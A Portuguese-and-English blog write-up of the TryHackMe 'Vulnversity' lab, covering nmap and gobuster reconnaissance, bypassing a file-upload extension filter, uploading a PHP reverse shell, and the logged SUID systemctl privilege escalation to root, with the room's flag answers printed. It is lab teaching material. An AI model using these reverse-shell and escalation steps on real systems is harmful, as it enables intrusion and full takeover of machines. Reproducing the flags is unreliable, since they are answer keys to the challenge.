```yaml
title: Vulnversity - Writeup [TryHackMe]
description: 'Resumão geral da matéria com resolução de exercício'
author: matheus
tags: ["tryhackme", "WriteUps"]
categories: ["SecLab", "Hacking"]
pin: false
comments: true
```

# Vulnversity - Desafio Hacker

> *Será pulado desse writeup as tasks sobre estar conectado a VPN, ter um sistema com NMAP instalado, estar conectado na máquina do desafio e também pularemos as perguntas que não precisam de resposta.*

## Escaneando

```shell
nmap -sV 10.10.84.129
```

 ![image](https://i.imgur.com/gZqOO8D.png)

### nmap flag    Description

| Nmap flag      | City                                                                                   |
| -------------- | -------------------------------------------------------------------------------------- |
| `-sV`          | `Attempts to determine the version of the services running`                            |
| `-p<x> or -p-` | `Port scan for port <x> or scan all ports`                                             |
| `Pn`           | `Disable host discovery and just scan for open ports`                                  |
| `-A`           | `Enables OS and version detection, executes in-build scripts for further enumeration.` |
| `-sC`          | `Scan with the default nmap scripts`                                                   |
| `-v    `       | `Verbose mode`                                                                         |
| `-sU`          | `UDP port scan`                                                                        |
| `-sS`          | `TCP SYN port scan`                                                                    |

```yml
 nmap -sV -Pn 10.10.84.129

 nmap -sV 10.10.84.129
```

O nmap tende a escanear as mil portas mais comuns, é interessante fazer um scan que va nas outras portas acima disso, temos mais de 65 mil portas. 

Podemos utilizar o HELP do shell para saber mais parâmetros e até ajudar a responder algumas questões (coloquei acima).

Algumas coisas que gostaria add aqui para utilizarmos, poderia ser o seguinte:

Usar o -sS, que é por tcp SYN

Usar para ir em TODAS as portas ou entre portas especificadas. *(No exemplo são TODAS as 65535 PORTAS, mas feito de forma especificada. Para ir em todas, poderia ter apenas usado -p1-)*

```shell
nmap -sS -p1-65535 10.10.84.129
```

São muitas portas, o que também demandaria MUITO mais tempo também...

Podemos utilizar uma forma de agilizar os pacotes com o -T4 (**cuidado ao usar o -T5 por ter risco de te derrubar**). O -T4 e o -T5 manda muitos pacotes de uma só vez para agilizar.

Podemos, também utilizar uma força maior no '*verbose*' para mostrar tudo na tela de forma mais detalhada o q está acontecendo, nesse caso podemos por -vv

```shell
sudo nmap -sS -p1- 10.10.84.129 -T4 -vv
```

## Quantas portas estão abertas?

Eu fiz o exercício com o comando:

```shell
sudo nmap -sV -Pn 10.10.84.129
```

Assim o resultado deu o mesmo sem demorar tanto tempo, para este exercício deu certo.

De qualquer forma, a saída sairia - resumidamente e objetivamente - mais ou menos como no exemplo abaixo; 

***(retirado a aba 'service' e 'version' para melhor visualização)***

```yaml
┌──(laidler㉿kali)-[~/Documents/seclab]
└─$ nmap -sV -Pn 10.10.84.129
PORT     STATE
21/tcp   open
22/tcp   open
139/tcp  open
445/tcp  open
3128/tcp open
3333/tcp open
```

Podemos ver que temos 6 portas abertas detectadas, o que responde a questão.

```yaml
 6
```

## Versão do squid proxy?

Na saída do comando `nmap -sV -Pn 10.10.84.129` mostrado acima, ele não apenas mostra na saída qual a porta e seu estado (aberto), mas também mostra o serviço e qual a versão do mesmo.

Logo, a resposta fica clara na saída deste comando também:

```yaml
┌──(laidler㉿kali)-[~/Documents/seclab]
└─$ nmap -sV -Pn 10.10.84.129
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
3128/tcp open  http-proxy  Squid http proxy **3.5.12**
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

`Squid http proxy **3.5.12**`

```yaml
 3.5.12
```

## NMap escanearia quantas portas com o parâmetro -p-400?

De acordo com o que foi explicado anteriormente, daria para responder numa boa, né? haha.

```yaml
 400
```

## Já o parâmetro -n, o que o nmap não irá resolver?

 Usando a flag *-n* no nmap, ele **não** resolverá os nomes de domínio DNS. Isso significa que o nmap não tentará converter endereços IP em nomes de host. Isso pode ser útil para **acelerar** as varreduras.
 Podemos achar essa resposta se usarmos o `HELP` para ver o que cada parâmetro/flag faz.

```yaml
 DNS
```

## Qual sistema operacional provavelmente stá sendo rodado? Qual porta está rodando o web server?

Ainda usando a mesma saída de `nmap -sV -Pn 10.10.84.129` podemos ver que estamos falando do Ubuntu, com web server na porta *3333*, ou seja, temos um site em `http://10.10.84.129:3333`.

> Salvo engano, temos como detectar com o parãmetro -A

```yaml
 Ubuntu
```

```yaml
 3333
```

> # GoBuster - DirBruteforce

GoBuster é uma ferramenta usada para forçar bruscamente URIs (diretórios e arquivos), subdomínios DNS e nomes de host virtual. Para esta máquina, vamos nos concentrar em usá-lo para forçar bruscamente os diretórios. 
Eu geralmente uso outras ferramentas, como o `dirb` ou `dirsearch`, mas esse é bem legal também.

Qualquer coisa só rodar o `sudo apt-get install gobuster`

Se também tiver no `Kali Linux`, tu vai achar umas wordlists em `/usr/share/wordlists`.

```shell
gobuster dir -u http://<ip>:3333 -w < word list location and/or name >
```

Vamos utilizar para encontrar um diretório que pode ser usado para fazer o upload de um shell.

### Usando o GoBuster

Utilizei com uma wordlist baixada que se encontra no mesmo diretório.

```shell
`gobuster dir -u http://10.10.84.129:3333 -w common.txt
```

> Você pode pesquisar pela wordlist 'directory-list-2.3-medium.txt' que resolverá o desafio.

Parâmetros do GoBuster;

| GoBuster Flag       | Description                                                     |
| ------------------- | --------------------------------------------------------------- |
| `-e`                | `Print the full URLs in your console`                           |
| `-u`                | `The target URL`                                                |
| `-w`                | `Path to your wordlist` `E.g:  /usr/share/wordlists/dirbuster/` |
| `-U and -P`         | `Username and Password for Basic Auth`                          |
| `-p <x>`            | `Proxy to use for requests`                                     |
| `-c <http cookies>` | `Specify a cookie for simulating your auth`                     |

## Qual diretório é uma aba de upload?

Com o comando e uma saída mais ou menos como:

```yaml
┌──(laidler㉿kali)-[~/Documents/seclab]
└─$ gobuster dir -u "http://10.10.84.129:3333/" -w common.txt 

===============================================================
[+] Url:                     http://10.10.84.129:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
===============================================================
images               (Status 301) [Size 320] [--> http://10.10.84.129:3333/images/]
css                  (Status 301) [Size 317] [--> http://10.10.84.129:3333/css/]
fonts                (Status 301) [Size 319] [--> http://10.10.84.129:3333/fonts/]
internal             (Status 301) [Size 322] [--> http://10.10.84.129:3333/internal/]
```

podemos perceber, ao olhar esses diretórios, que o único deles que parece ter algo é o '*internal*', então se abrirmos a página `http://10.10.84.129:3333/internal/` iremos nos deparar com uma página de upload.

```yaml
 /internal/
```

> # Comprometer o webserver - Exploração da falha

### Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

```yaml
 upload evershall.phtml file.
```

# Answer the questions below

## What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.

```yaml
  .php
```

To identify which extensions are not blocked, we're going to fuzz the upload form.

To do this, we're going to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please complete our BurpSuite room first.

![image](https://i.imgur.com/j71CW1A.png)

We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions in:

```wordlist.txt
.php
.php3
.php4
.php5
.phtml
```

![image](https://i.imgur.com/ED153Nx.png)

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:

![image](https://i.imgur.com/6dxnzq6.png)

## Run this attack, what extension is allowed?

```yaml
 .phtml
```

Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell here.

To gain remote access to this machine, follow these steps:

```
1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).

2. Rename this file to php-reverse-shell.phtml

3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

5. You should see a connection on your netcat session
```

![image](https://i.imgur.com/FGcvTCp.png)

## What is the name of the user who manages the webserver?

```yaml
 bill
```

## What is the user flag?

```yaml
 8bd7992fbe8a6ad22a63361004cfcedb
```

> # Task 5 Privilege Escalation
> 
> Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

# Answer the questions below

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![image](https://i.imgur.com/ZhaNR2p.jpg)

## On the system, search for all SUID files. What file stands out?

```yaml
 /bin/systemctl
```

### Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?

```yaml
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.18.8.23] from (UNKNOWN) [10.10.84.129] 47082
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:45:16 up  5:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
bash-4.3$ ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr

bash-4.3$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TFTF=$(mktemp).service
bash-4.3$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
bash-4.3$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
bash-4.3$ 
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
bash-4.3$ 

bash-4.3$ ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr
bash-4.3$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
bash-4.3$ cd root
cd root
bash: cd: root: Permission denied
bash-4.3$ cd /root
cd /root
bash: cd: /root: Permission denied
bash-4.3$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr
bash-4.3# cd root
cd root
bash-4.3# ls
ls
root.txt
bash-4.3# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
bash-4.3# 
```

## Become root and get the last flag (/root/root.txt)

```yaml
 a58ff8579f0a9270368d33a9966c7fd5
```